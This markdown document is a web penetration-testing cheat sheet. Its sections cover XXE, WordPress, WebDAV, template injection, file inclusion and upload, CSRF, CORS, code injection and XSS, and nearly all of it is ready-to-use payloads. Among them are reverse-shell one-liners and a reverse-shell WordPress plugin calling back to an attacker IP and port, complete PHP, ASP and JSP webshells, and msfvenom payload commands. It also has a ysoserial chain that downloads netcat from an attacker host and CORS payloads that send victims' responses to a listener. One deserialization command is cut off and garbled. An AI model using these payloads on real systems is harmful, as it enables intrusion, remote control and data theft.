
# Web Pentesting Notes

## Table of Contents
1. [XXE (XML External Entity)](#xxe-xml-external-entity)
    - [File Retrieval](#file-retrieval)
    - [SSRF](#ssrf)
    - [XInclude Attack](#xinclude-attack)
    - [XXE Through Modified Content-Type](#xxe-through-modified-content-type)
    - [XXE Through File Upload](#xxe-through-file-upload)
2. [WordPress](#wordpress)
    - [Standard Pages and Folders](#standard-pages-and-folders)
    - [Plugin Enumeration](#plugin-enumeration)
    - [Authenticated RCE](#authenticated-rce)
    - [Pivoting](#pivoting)
    - [XML-RPC](#xml-rpc)
3. [WebDAV](#webdav)
    - [Enumeration](#enumeration)
    - [File Upload](#file-upload)
4. [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
    - [Testing for SSTI](#testing-for-ssti)
    - [Server-Side Injection Examples](#server-side-injection-examples)
5. [File Vulnerabilities](#file-vulnerabilities)
    - [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
    - [RFI (Remote File Inclusion)](#rfi-remote-file-inclusion)
    - [File Upload Functionality](#file-upload-functionality)
6. [Enumeration](#enumeration)
    - [Google Dorks](#google-dorks)
    - [Site Analysis Tools](#site-analysis-tools)
    - [SOAP Services](#soap-services)
7. [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
    - [Payloads](#payloads)
    - [Security Bypass](#security-bypass)
8. [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
    - [Insecure Configurations](#insecure-configurations)
9. [RCE (Remote Code Execution)](#rce-remote-code-execution)
    - [Injection in Parameters](#injection-in-parameters)
10. [Code Injection](#code-injection)
    - [Examples in Different Languages](#examples-in-different-languages)
11. [APIs and Fields](#apis-and-fields)
    - [Simulating Requests](#simulating-requests)
    - [Testing Parameters](#testing-parameters)
12. [Reflected XSS (Cross-Site Scripting)](#reflected-xss-cross-site-scripting)
    - [Context and Payloads](#context-and-payloads)
13. [Filter Evasion](#filter-evasion)
    - [Common Techniques](#common-techniques)
14. [DOM Based XSS](#dom-based-xss)
    - [Injection Vectors](#injection-vectors)

## XXE (XML External Entity)

### File Retrieval
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://<path>"> ]>
<field>&xxe;</field>
```

### SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<url>/"> ]>
<field>&xxe;</field>
```

### XInclude Attack
#### Read Local File
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

#### SSRF
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="<url>"/>
</foo>
```

### XXE Through Modified Content-Type
#### POST Request
Original request:
```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

var=value
```
Modified request:
```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><var>value</var>
```

#### JSON Body
Original request:
```http
POST /action HTTP/1.0
Content-Type: application/json
Content-Length: 38

{"search":"name","value":"val"}
```
Modified request:
```http
POST /action HTTP/1.0
Content-Type: application/xml
Content-Length: 288

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

### XXE Through File Upload
#### XSLT
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('<path>')"/>
  </xsl:template>
</xsl:stylesheet>
```

#### SVG
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://<path>" > ]>
<svg width="256px" height="256px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="12" x="0" y="16">&xxe;</text>
</svg>
```

## WordPress

### Standard Pages and Folders
#### License Files
- `/license.txt`
- `/readme.html`

#### Login Pages
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`

#### Resource Folders
- `wp-content/uploads/` resources folder
- `wp-content/themes/` themes folder
- `wp-includes/` plugins, scripts, and widgets

### Plugin Enumeration
Use the tool [wpscan](https://github.com/wpscanteam/wpscan):
```sh
wpscan --update
wpscan --url <host> --enumerate u,p  # List users and installed plugins
wpscan --url <host> --enumerate ap,at,cb,dbe  # Bruteforce installed plugins
```

### Authenticated RCE
#### Template Editor
Modify a PHP page via the template editor, preferably the 404 page. Modified files are usually located under `/wp-content/themes/<theme>/<page>.php`.

#### Plugin Upload Functionality
Create a reverse shell plugin:
```php
<?php
/**
 * Plugin Name: Reverse Shell Plugin
 * Plugin URI:
 * Description: Reverse Shell Plugin
 * Version: 1.0
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
?>
```
Zip the PHP file and upload it via the plugin interface, then activate it.

### Pivoting
Check for plain-text database credentials in `wp-config.php`:
```sh
cat <wp-folder>/wp-config.php  # Local
wget <url>/wp-config.php  # Remote
```

### XML-RPC
#### Check if Active
Send the following request to `/xmlrpc.php`:
```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

#### Credentials Bruteforce
Use `wp.getUsersBlogs`, `wp.getCategories`, or `metaWeblog.getUsersBlogs`:
```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>[user]</value></param>
<param><value>[pass]</value></param>
</params>
</methodCall>
```

#### File Upload
Requires valid credentials:
```xml
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><string>1</string></value></param>
    <param><value><string>[user]</string></value></param>
    <param><value><string>[pass]</string></value></param>
    <param>
      <value>
        <struct>
          <member>
            <name>name</name>
            <value><string>[filename]</string></value>
          </member>
          <member>
            <name>type</name>
            <value><string>[mime type]</string></value>
          </member>
          <member>
            <name>bits</name>
            <value><base64><![CDATA[base64 blob here]]></base64></value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

## WebDAV

### Enumeration
Send a PROPFIND request:
```sh
curl -vX PROPFIND --header 'Depth:0' '<host>/<folder>'
curl -vX PROPFIND --header 'Depth:0' '<host>/<folder>' --user '<user>:<pass>' --basic
```

### File Upload
#### Cadaver
```sh


cadaver <host>
```
Cadaver will prompt for credentials when performing restricted operations:
```sh
ls                        
cd <folder>    
cat <filename>           
put <file>
get <file>
mput <files>   # Multiple file upload (supports wildcards)
mget <files>   # Multiple file download (supports wildcards)
move <filename> <folder>
copy <filename> <folder>
delete <filename>
```

#### Manual
```sh
curl -T '<file>' '<url>'  # Anonymous
curl -T '<file>' '<url>' -u <user>:<pass>
```

### RCE
Bypass extension filter by renaming the uploaded file:
```sh
curl -X MOVE --header 'Destination:http://<host>/shell.asp' '<host>/shell.txt'
curl -X COPY --header 'Destination:http://<host>/shell.asp' '<host>/shell.txt'
```

## SSTI (Server-Side Template Injection)

### Testing for SSTI
Submit a fuzzed payload such as `${{<%[%'"}}%\`. If a stack trace error is displayed, the application is vulnerable. Distinguish between XSS and SSTI by submitting payloads that trigger mathematical operations like `${2*2}`.

### Server-Side Injection Examples
#### ASP
```asp
<%= 7*7 %>
<%= "foo" %>
<%= response.write(date()) %>
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('<path to ps1 script>')").StdOut.ReadAll() %>
```

#### Java
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
${T(java.lang.System).getenv()}
```

#### FreeMarker
```ftl
${7*7}
#{7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("<cmd>") }
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('<cmd>') }
${"freemarker.template.utility.Execute"?new()("<cmd>")}
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("<cmd>")}
```

#### Velocity
```velocity
$class.type
$class.inspect("java.lang.Runtime").type
$ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("<cmd>")
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("<cmd>"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

#### Thymeleaf
```html
${7*7}
[[${7*7}]]
[(${7*7})]
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("<cmd>")}
```

#### Pebble
```html
{{ someString.toUPPERCASE() }}
{% raw %}
{% set cmd = '<cmd>' %}
{% endraw %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

#### JinJava
```jinja
{{'a'.toUpperCase()}}  # Would result in 'A'
{{ request }}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('<cmd>')")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"<cmd>\"); x.start()")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"<cmd>\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
```

#### NodeJS
##### Handlebars
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

##### JsRenderer
```javascript
{{:"a".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('<cmd>').toString()")()}}
{{:%22a%22.toString.constructor.call({},%22<XSS payload>%22)()}}
```

##### Jade
```jade
#{{7*7}}
#{root.process.mainModule.require('child_process').spawnSync('<cmd>', ['<arg>']).stdout}
```

##### PugJS
```pug
#{{7*7}}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('<cmd>')}()}
```

##### Nunjucks
```nunjucks
{{console.log(1)}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('<cmd>')")()}}
```

#### PHP
##### Smarty
```smarty
{$smarty.version}
{php}echo `<cmd>`;{/php}
{system('<cmd>')}
```

##### Twig
```twig
{{7*7}}
{{7*'7'}}
{{_self}}
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("<cmd>")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<cmd>")}}
{{['<cmd>']|filter('system')}}
```

#### Python
##### Jinja2
```jinja2
{{7*'7'}}  # Results in '7777777'
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<cmd>\", \"<args>\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% endraw %}
{{request.application.__globals__.__builtins__.__import__('os')['popen']('<cmd>')['read']()}}
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('<cmd>')['read']()}}
```

##### Tornado
```tornado
{{7*7}}
{% raw %}
{% import foobar %}
{% endraw %}
{% raw %}
{% import os %}
{% endraw %}
{{os.system('<cmd>')}}
```

##### Mako
```mako
{{7*7}}
<%
import os
x=os.popen('<cmd>').read()
%>
```

#### Ruby
##### ERB
```erb
<%= 7*7 %>  # Outputs 49
{{7*7}}  # Outputs {{7*7}}
${7*7}  # Outputs ${7*7}
<%= system("<cmd>") %>
<%= `<cmd>` %>
<%= IO.popen('<cmd>').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('<cmd>') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('<cmd>') %><%= @c.readline()%>
<%= Dir.entries('/') %>
<%= File.open('<file>').read %>
```

##### Slim
```slim
${7*7}
{ %x|env| }
```

#### .Net
##### Razor
```razor
@(2+2)
@()
@
@System.Diagnostics.Process.Start("<cmd>","<args>");
```

### Client-Side Injection Examples


#### AngularJS
```html
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

#### VueJS
```vue
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
{{_openBlock.constructor('alert(1)')()}}  # V3
{{constructor.constructor('alert(1)')()}}  # V2
```

#### Mavo
```mavo
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
```

## File Vulnerabilities

### LFI (Local File Inclusion)
#### Payloads
```sh
# Linux
../../../../../../../../../../../../etc/passwd

# Windows
..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini
..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
```

#### Importing with File Modifiers
Disclose PHP file source code:
```html
<url>?<arg>=php://filter/convert.base64-encode/resource=<php-file>.php
```

Execute webshell from a ZIP file:
```html
<url>?<arg>=zip://<path-to-zip-file>%23<webshell>?<args>
```

### RFI (Remote File Inclusion)
#### Payloads
```sh
www.google.com  # Expect to see HTML code as result
<your-url>:<port>  # Start a listener on the port and see if you receive an HTTP request
```

### File Upload Functionality
#### Filename Payloads
```sh
../../../tmp/evil.png  # Test for LFI
sleep(10)-- -.jpg  # Test for SQLi
<svg onload=alert(document.domain)>  # Test for stored XSS
; sleep 10;  # Test for RCE
```

#### Evade File Restrictions
```sh
file.png.php
file.png.Php5
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```

#### Magic Bytes
```sh
python -c "print '<signature>'" > <file>
# Hex signature example: \x4D\x5A
```

#### ImageTrick Vulnerability
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|nc -e /bin/sh <IP> <PORT>)'
pop graphic-context
```

## Enumeration

### Google Dorks
```text
"Info:<url>"
site:<url>
site:<url> -inurl:https
site:<url> -filetype: .
site:<url> filetype:Log allintext:"username" "password"
site:<url> ext:pdf
```

#### Social Media
```text
<query> @<facebook|twitter|linkedin...>
```

#### Specific Dorks
```text
# SOAP WSDL file
inurl:wsdl
filetype:wsdl

# SQL Dump
"index of" "database.sql.zip"

# FTP server
intitle:”index of” inurl:ftp

# WordPress admin page
intitle:"Index of" wp-admin

# Apache2
intitle:"Apache2 Ubuntu Default Page: It works"

# PHPMyAdmin
"Index of" inurl:phpmyadmin

# JIRA/Kibana
inurl:Dashboard.jspa intext:"Atlassian Jira Project Management Software"
inurl:app/kibana intext:Loading Kibana

# cPanel password reset
inurl:_cpanel/forgotpwd
```

### Site Analysis Tools
#### WhatWeb
Download from [here](https://github.com/urbanadventurer/WhatWeb):
```sh
whatweb -v <url>  # Standard scan
whatweb -v -a3 <url>  # Aggressive scan
whatweb -v <url> -u <user>:<pass>  # Basic auth
```

Use with proxy:
```sh
whatweb -v <url> --proxy <url> --proxy-user <user>:<pass>
```

Plugins:
```sh
whatweb -l  # List all plugins
whatweb -I <keyword>  # Search by keyword and show detailed description
whatweb --dorks=<plugin>  # List Google dorks used by the plugin
whatweb -i <plugin> <url>  # Use the specified plugin during scan
```

#### Nikto
```sh
nikto -host <site-url> -port <port> -maxtime <max-time-for-scan>
nikto -host <site-url> -port <port> -dbcheck
```

#### Check for Page Formats
```sh
index.html  # Static
index.php  # PHP
index.asp  # IIS
index.aspx  # IIS
index.do  # JSP based
index.jsp  # JSP based
```

#### Dumping Certificates
```sh
openssl s_client -connect <ip>
openssl x509 -in <file>.pem -text  # Pretty print certificate
```

#### Create Own Certificate
```sh
openssl genrsa -out <name>.key 2048
openssl -req -new -key <name>.key -out <cert>.csr
openssl x509 -req -in <cert>.csr -CA <cert-authority> -CAkey <remote-key>.key -CAcreateSerial -days 1024 -sha256 -o <file>.pem
openssl pkcs12 -export -out <file>.pfx -in <file>.pem -inkey <name>.key -certfile <remote-cert>.cert
```

### SOAP Services
Append the following payloads to the service URL to find the definition file:
```text
<url>?wsdl
<url>.wsdl
<url>?disco  # ASP.NET
<url>.disco  # ASP.NET
```

### Git Repository
Dump all files in the repository with [git-dumper](https://github.com/arthaud/git-dumper):
```sh
python3 git-dumper.py <url> <local-folder>
```

## CSRF (Cross-Site Request Forgery)

### Payloads
#### GET Request
```html
<img src="<url>" width="0" height="0" border="0">
<a href="<url>">Click me!</a>
```

#### POST Request in Form
```html
<form id="f1" action="<url>" method="POST">
  <input type="hidden" name="<arg1>" value="<value1>"/>
  <input type="hidden" name="<arg2>" value="<value2>"/>
  <input type="submit" value="click me"/>
</form>
<body onload="document.getElementById('f1').submit()">
```

#### Request with JSON
Requires CORS to accept requests from all sources (`Access-Control-Allow-Origin: *`):
```html
<script>
function req() {
  var x = new XMLHttpRequest();
  x.open("<PUT|HEAD|POST>", "<url>", true);
  x.setRequestHeader("Content-Type", "application/json");
  x.send(JSON.stringify(<JSON Object>));
}
</script>
<body onload="req()">
```

### Security Bypass
#### Incorrect CSRF Token Validation
Conditions that may lead to vulnerability:
- The token is validated only for POST requests.
- If the token is missing, the request is not invalidated.
- The token is part of a pool of possible values, allowing reuse.
- The token is stored in a non-session cookie.

#### Referer Header
Include `Referrer-Policy: unsafe-url` in the response:
```html
<meta name="referrer" content="never">
```

## CORS (Cross-Origin Resource Sharing)

### Insecure Configurations
#### Access Allowed from Any Domain
Request:
```http
GET <target-url> HTTP/1.1
Host: <target-url>
Origin: <listener-url>
```

Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: <listener-url>
Access-Control-Allow-Credentials: true
```

#### Payload
```html
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', '<url>', true);
req.withCredentials = true;
req.send();

function reqListener() {
  location = '<listener-url>/log' + this.responseText;
}
```

#### Allowed NULL Origin
Request:
```http
GET <url> HTTP/1.1
Host: <url>
Origin: null
```

Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

#### Payload
Include the script in an iframe to set the Origin to null:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req =

 new XMLHttpRequest();
req.onload = reqListener;
req.open('get','<url>',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='<listener-url>/log?key='+this.responseText;
};
</script>"></iframe>
```

## RCE (Remote Code Execution)

### Injection in Parameters
```sh
curl http://<url>?<arg>=<cmd>  # GET
curl -G "http://<url>" --data-urlencode "<cmd>"  # GET encoded
```
For Windows paths, escape separators as `\\`.

## Code Injection

### Examples in Different Languages
#### PHP
##### Reverse Shell
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
```
From msfvenom:
```sh
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o payload.php
```

##### Webshell
```php
<?php
if(isset($_REQUEST['cmd'])){
  echo "<pre>";
  $cmd = ($_REQUEST['cmd']);
  system($cmd);
  echo "</pre>";
  die;
}
?>
```

##### Code Injection
```php
echo exec("<cmd>");
echo passthru("<cmd>");
echo system("<cmd>");
echo shell_exec("<cmd>");
echo `<cmd>`;
eval('<php code>')
assert('<php code>')
```

##### Information Gathering
```php
phpinfo();
posix_mkfifo();
posix_getlogin();
posix_ttyname();
getenv();
get_current_user();
proc_get_status();
get_cfg_var();
disk_free_space();
disk_total_space();
diskfreespace();
getcwd();
getlastmo();
getmygid();
getmyinode();
getmypid();
getmyuid();
```

#### .NET
##### Reverse Shell
From msfvenom:
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp

msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
```

##### Webshell
```asp
<%@ Language=VBScript %>
<%
  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oFile
  Dim szCMD, szTempFile
  On Error Resume Next
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then
    szTempFile = "C:\" & oFileSys.GetTempName()
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
  End If
%>
<HTML>
<BODY>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
  <input type=text name=".CMD" size=45 value="<%= szCMD %>">
  <input type=submit value="Run">
</FORM>
<PRE>
  <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
  <br>
  <%
    If (IsObject(oFile)) Then
      On Error Resume Next
      Response.Write Server.HTMLEncode(oFile.ReadAll)
      oFile.Close
      Call oFileSys.DeleteFile(szTempFile, True)
    End If
  %>
</BODY>
</HTML>
```

```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
  void Page_Load(object sender, EventArgs e) { }
  string ExcuteCmd(string arg) {
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
  }
  void cmdExe_Click(object sender, System.EventArgs e) {
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
    Response.Write("</pre>");
  }
</script>
<HTML>
<HEAD>
  <title>awen asp.net webshell</title>
</HEAD>
<body>
  <form id="cmd" method="post" runat="server">
    <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
    <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
    <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
  </form>
</body>
</HTML>
```

#### Java
##### Reverse Shell
JSP File:
```jsp
<%=Process p=new ProcessBuilder("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'").redirectErrorStream(true).start();Socket s=new Socket("'<host>'", <port>);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();%>
```
From msfvenom:
```sh
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f jsp -o rv.jsp
```
From WAR file:
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f war > reverse.war
strings reverse.war | grep jsp  # Get the name of the file
```

##### Webshell
```jsp
<FORM METHOD=GET ACTION='cmdjsp.jsp'>
  <INPUT name='cmd' type=text>
  <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  String output = "";
  if(cmd != null) {
    String s = null;
    try {
      String cmdFull = cmd;
      if(System.getProperty("os.name").toLowerCase().startsWith("windows")) {
        cmdFull = "cmd.exe /C " + cmd;
      }
      Process p = Runtime.getRuntime().exec(cmdFull);
      BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
      while((s = sI.readLine()) != null) {
        output += s;
      }
    } catch(IOException e) {
      e.printStackTrace();
    }
  }
%>
<pre>
  <%=output %>
</pre>
```

##### Parameter Injection
```java
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
<%=T(java.lang.Runtime).getRuntime().exec('<cmd>')%>
${class.getClassLoader()}
${class.getResource("").getPath()}
${T(java.lang.System).getenv()}
```

##### Deserialization
Use ysoserial to exploit Java deserialization vulnerabilities. Download from [here](https://github.com/frohoff/ysoserial).

Deploy payload:
```sh
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 <command or payload>
```

NC upload and reverse shell:
```sh
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<local-ip>/nc.exe','C:\<path>\nc.exe')\""
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "C:\<target-folder>\nc.exe -nv <local-ip> <local-port> -e cmd.exe"
```

Powershell:
```sh
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powers

hell -c \"$c
```

#### Python
##### Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### Parameter Injection
```python
os.system("<cmd>")
import os;print(str(os.popen('<cmd>').read()));
```

## APIs and Fields

### Simulating Requests
#### GET
```sh
curl <url>
```

#### HEAD
```sh
curl -I <url>
```

#### PUT
```sh
curl -T <file> http://www.upload.com/myfile
```

#### GET - Params
```sh
curl <url>?field=value&field2=value2
```

#### GET - Follow Redirect
```sh
curl -L <url>
```

#### GET - Custom Headers
```sh
curl <url> -H "header1: value" -H "header2: value"
```

#### GET - Custom Cookies
```sh
curl -b "name1=value1; name2=value2" <url>
```

#### POST - Form Data
```sh
curl -X POST <url> -H "Content-Type: application/x-www-form-urlencoded" -d "key1=value1&key2=value2"
```

#### POST - JSON
```sh
curl -X POST <url> -H 'Content-Type: application/json' -d '{"field1":"value1","field2":"value2"}'
```

#### POST - Send File
```sh
curl -X POST <url> -d @<path-to-file>
curl -X POST <url> -F @<path-to-file>  # As form encoded
curl -X POST <url> --data-binary @<path-to-file>  # Use this if file is corrupted
```

#### POST - Basic Auth
```sh
curl -X POST <url> --user "<user>:<password>"
curl -X POST <url> -H "Authorization: Basic $(echo -n "<user>:<pass>" | base64)"
curl -X POST <url> -H "Authorization: Bearer <token>"
```

### Testing Parameters
#### SQL Injection
```sql
'"`) or 'a' = 1;
'"` or 1 = 1;
sleep(5)#
or sleep(5)#
;waitfor delay '0:0:5'--
" or pg_sleep(5)--
```

#### XSS
```html
<script>alert(document.domain)</script>
<img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
`"'><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
/><img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
```

#### Template Injection
```twig
4*4
{{4*4}}
${4*4}
{4*4}
<%= 4*4 %>
```

#### RCE
```sh
os.system('<cmd>')
T(java.lang.Runtime).getRuntime().exec("<cmd>");
echo exec("<cmd>");
echo `<cmd>`;
<!--#exec cmd="<cmd>" -->
whoami
$(whoami)
;whoami
||whoami
&&whoami
```

#### Local File Inclusion
```sh
../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\Windows\system.ini
..\..\..\..\..\..\..\..\..\boot.ini
```

#### Remote File Inclusion
```sh
http://www.google.com
http://<controlled-ip>
```

## Reflected XSS (Cross-Site Scripting)

### Context and Payloads
#### AccessKey Attribute
```html
<url>/?%27accesskey=%27<key>%27onclick=%27alert(1)
```

#### HTML Parameter
```html
"><script>...</script>
"><svg onload="...">
"><img src=. onerror="...">
```

Anchor href parameter poisoning:
```html
href="javascript:'...'"
```

#### HTML Tags
1. Find vulnerable field.
2. Send request to Burp Intruder as `<§[payload]§>` to find unfiltered tags.
3. Set the payload to a list of tags.
